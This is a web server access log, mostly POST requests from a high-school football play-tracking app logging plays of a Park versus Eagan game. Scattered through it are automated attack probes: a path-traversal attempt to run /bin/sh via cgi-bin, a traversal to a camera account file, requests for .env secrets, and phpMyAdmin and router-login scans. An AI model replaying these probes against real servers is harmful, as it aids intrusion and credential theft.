75.72.177.151 - - [12/Sep/2022:00:26:31 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=11&quarter=1&drive=2&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=2&distance=8&down=2&yard=22&lat=2.1799777567987784&lon=5.185602464071746&hash=Middle&r_lat=2.410514003074985&r_lon=5.779170955330742&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Non%20Passing%20Play HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:27:59 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=12&quarter=1&drive=2&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=3-4&formation=Trips%20Flex&result=5&distance=6&down=3&yard=24&lat=2.410514003074985&lon=5.779170955330742&hash=Right&r_lat=2.865613284096387&r_lon=8.499708990157627&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=5&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:31:12 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=13&quarter=1&drive=3&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=10&distance=10&down=1&yard=35&lat=3.4692630077836695&lon=5.053797505001848&hash=Right&r_lat=4.502222378966138&r_lon=7.762255845224378&strength=Right&playtype=Boot%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=91&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:33:05 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=14&quarter=1&drive=3&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=58&distance=10&down=1&yard=45&lat=4.502222378966138&lon=7.762255845224378&hash=Middle&r_lat=10.266982125983766&r_lon=5.494117509736882&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%203&ballcarrier=9&passzone=Deep%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
152.89.196.211 - - [12/Sep/2022:00:34:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:35:05 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=15&quarter=1&drive=4&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=0&distance=10&down=1&yard=69&lat=6.892907211376303&lon=4.301299083142492&hash=Middle&r_lat=6.882006428513675&r_lon=4.328780392670023&strength=Right&playtype=Boot%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=2&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:35:54 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=16&quarter=1&drive=4&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=12&distance=10&down=2&yard=69&lat=6.882006428513675&lon=4.328780392670023&hash=Left&r_lat=8.074479532124515&r_lon=3.9108166604108123&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:37:19 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=17&quarter=1&drive=4&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=20&distance=10&down=1&yard=81&lat=8.074479532124515&lon=3.9108166604108123&hash=Right&r_lat=10.071614589425868&r_lon=7.383988991933435&strength=Left&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=5&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:38:48 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=18&quarter=1&drive=5&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=1&yard=20&lat=1.9551160173887603&lon=5.081340771389541&hash=Middle&r_lat=2.0498005490893805&r_lon=4.902551300700911&strength=Right&playtype=Inside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:39:51 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=19&quarter=1&drive=5&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=1&distance=10&down=2&yard=20&lat=2.0498005490893805&lon=4.902551300700911&hash=Middle&r_lat=2.1087381250832067&r_lon=4.88900860671044&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=5&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:45:48 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=20&quarter=1&drive=6&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=1&distance=10&down=1&yard=15&lat=1.4552087727297482&lon=5.768187638997557&hash=Middle&r_lat=1.592683511324279&r_lon=5.728126118091846&strength=Right&playtype=Inside%20Run&playdir=Right&coverage=Zone%203&ballcarrier=23&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:49:02 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=21&quarter=1&drive=6&simplified=false&pright=0&pmiddle=1&pleft=0&pstunt=0&dformation=4-3&formation=Storm&result=-5&distance=9&down=2&yard=16&lat=1.592683511324279&lon=5.728126118091846&hash=Middle&r_lat=1.054976590026663&r_lon=5.730088644662939&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:49:51 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=22&quarter=1&drive=6&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=11&distance=14&down=3&yard=11&lat=1.054976590026663&lon=5.730088644662939&hash=Middle&r_lat=2.18332989962797&r_lon=4.3182882565559755&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=9&passzone=Flats%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:51:14 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=23&quarter=1&drive=7&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=11&distance=10&down=1&yard=26&lat=2.570047462668509&lon=4.258400841579167&hash=Left&r_lat=3.6835450358932054&r_lon=4.082102251796834&strength=Right&playtype=Inside%20Run&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Flats%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:54:09 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=24&quarter=1&drive=7&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=4&distance=10&down=1&yard=37&lat=3.6835450358932054&lon=4.082102251796834&hash=Left&r_lat=4.091810855156787&r_lon=4.043170023744312&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%203&ballcarrier=23&passzone=Flats%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:55:12 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=25&quarter=1&drive=7&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=4-3&formation=Wide&result=0&distance=6&down=2&yard=41&lat=4.091810855156787&lon=4.043170023744312&hash=Left&r_lat=4.108183668540332&r_lon=4.048571801438099&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=91&passzone=Middle%20-%20Middle HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:56:06 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=26&quarter=1&drive=7&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=4-3&formation=Tray&result=0&distance=6&down=3&yard=41&lat=4.108183668540332&lon=4.048571801438099&hash=Left&r_lat=4.124611208754167&r_lon=4.048571801438099&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%203&ballcarrier=91&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
152.89.196.211 - - [12/Sep/2022:00:56:10 +0000] "GET / HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:57:28 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=27&quarter=1&drive=8&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=5&distance=10&down=1&yard=25&lat=2.4609865645064017&lon=5.774647330078478&hash=Left&r_lat=2.971451630795968&r_lon=2.7207516999432446&strength=Left&playtype=Outside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:58:33 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=28&quarter=1&drive=8&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=7&distance=5&down=2&yard=30&lat=2.971451630795968&lon=2.7207516999432446&hash=Right&r_lat=3.689801262995806&r_lon=6.176450647980026&strength=Left&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=5&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:00:59:30 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=29&quarter=1&drive=8&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=0&distance=10&down=1&yard=37&lat=3.689801262995806&lon=6.176450647980026&hash=Right&r_lat=3.6975209288315196&r_lon=6.719482477330222&strength=Left&playtype=Inside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:00:19 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=30&quarter=1&drive=8&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=2&yard=37&lat=3.6975209288315196&lon=6.719482477330222&hash=Right&r_lat=3.713956520739106&r_lon=6.719482477330222&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=2&passzone=Middle%20-%20Middle HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:01:20 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=31&quarter=1&drive=8&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=3&yard=37&lat=3.713956520739106&lon=6.719482477330222&hash=Right&r_lat=3.730391806617385&r_lon=6.7139862154247005&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=9&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:11:17 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=32&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Thunder&result=5&distance=10&down=1&yard=34&lat=3.3824835982285095&lon=5.7922110673187595&hash=Middle&r_lat=3.8754968623147996&r_lon=4.247126500105637&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=13&passzone=Flats%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:12:34 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=33&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=16&distance=5&down=2&yard=39&lat=3.8754968623147996&lon=4.247126500105637&hash=Middle&r_lat=5.479245870532441&r_lon=5.769155800988695&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=5&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:13:38 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=34&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=4&distance=10&down=1&yard=55&lat=5.479245870532441&lon=5.769155800988695&hash=Right&r_lat=5.9003850355086644&r_lon=8.710778802474538&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=5&passzone=Middle%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:14:41 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=35&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=6&down=2&yard=59&lat=5.872276399519418&lon=8.696291911750667&hash=Right&r_lat=5.872276399519418&r_lon=8.707284435561672&strength=Left&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=9&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:15:33 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=36&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=0&distance=1&down=3&yard=64&lat=6.374473889048683&lon=5.755791792303976&hash=Middle&r_lat=6.429031652298438&r_lon=5.755791792303976&strength=Right&playtype=Pocket%20Pass&playdir=Right&coverage=Zone%204&ballcarrier=2&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:16:01 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=37&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=8&distance=1&down=4&yard=64&lat=6.429031652298438&lon=5.755791792303976&hash=Middle&r_lat=7.179200519300655&r_lon=5.0147955754816484&strength=Right&playtype=Inside%20Run&playdir=Left&coverage=Zone%204&ballcarrier=23&passzone=Middle%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
80.94.92.239 - - [12/Sep/2022:01:16:02 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
75.72.177.151 - - [12/Sep/2022:01:16:38 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=38&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=1&yard=72&lat=7.179200519300655&lon=5.0147955754816484&hash=Middle&r_lat=7.190094325795756&r_lon=5.0147955754816484&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=9&passzone=Deep%20-%20Left HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:17:04 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=39&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=0&distance=10&down=2&yard=72&lat=7.190094325795756&lon=5.0147955754816484&hash=Middle&r_lat=7.203711216427117&r_lon=5.0147955754816484&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=5&passzone=Deep%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:17:40 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=40&quarter=1&drive=9&simplified=false&pright=0&pmiddle=2&pleft=0&pstunt=0&dformation=3-4&formation=Tray&result=0&distance=10&down=3&yard=72&lat=7.203711216427117&lon=5.0147955754816484&hash=Middle&r_lat=7.228220588309927&r_lon=5.012047444528887&strength=Left&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=2&passzone=Middle%20-%20Middle HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
75.72.177.151 - - [12/Sep/2022:01:18:06 +0000] "POST /endzone/rest/addplay?&team=Park&opponent=Eagan&possession=Park&teamcode=EVHS22&year=2022&playnum=41&quarter=1&drive=9&simplified=false&pright=0&pmiddle=3&pleft=0&pstunt=0&dformation=3-4&formation=Wide&result=8&distance=10&down=4&yard=72&lat=7.228220588309927&lon=5.012047444528887&hash=Middle&r_lat=7.954526040153966&r_lon=5.82720912080248&strength=Right&playtype=Pocket%20Pass&playdir=Left&coverage=Zone%204&ballcarrier=5&passzone=Flats%20-%20Right HTTP/1.1" 200 308 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
152.89.196.211 - - [12/Sep/2022:01:18:40 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.231 - - [12/Sep/2022:01:39:44 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
78.110.69.76 - - [12/Sep/2022:01:40:57 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
104.248.75.7 - - [12/Sep/2022:01:40:57 +0000] "GET / HTTP/1.1" 200 960 "172.104.25.168" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
95.161.131.235 - - [12/Sep/2022:02:03:15 +0000] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 488 "-" "Mozilla/5.0 zgrab/0.x"
90.151.171.106 - - [12/Sep/2022:02:07:31 +0000] "GET http://v4.ident.me?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:02:07:46 +0000] "-" 408 0 "-" "-"
185.254.196.223 - - [12/Sep/2022:02:14:13 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Sep/2022:02:14:13 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.43.68.37 - - [12/Sep/2022:02:25:23 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [12/Sep/2022:02:25:23 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [12/Sep/2022:02:25:23 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [12/Sep/2022:02:25:23 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
79.110.62.213 - - [12/Sep/2022:03:35:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://172.104.25.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.235.24.156 - - [12/Sep/2022:04:11:42 +0000] "GET / HTTP/1.1" 200 2559 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.34.56.97 - - [12/Sep/2022:04:43:19 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
185.254.196.223 - - [12/Sep/2022:05:13:19 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Sep/2022:05:13:19 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.227 - - [12/Sep/2022:05:23:40 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
64.62.197.232 - - [12/Sep/2022:05:27:38 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
45.143.200.118 - - [12/Sep/2022:05:47:57 +0000] "\x03" 400 488 "-" "-"
181.214.206.161 - - [12/Sep/2022:05:59:00 +0000] "OPTIONS / HTTP/1.1" 200 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
192.241.219.55 - - [12/Sep/2022:06:34:41 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 zgrab/0.x"
43.131.66.209 - - [12/Sep/2022:06:37:49 +0000] "GET / HTTP/1.1" 200 2559 "-" "curl/7.64.1"
205.185.116.25 - - [12/Sep/2022:06:37:59 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
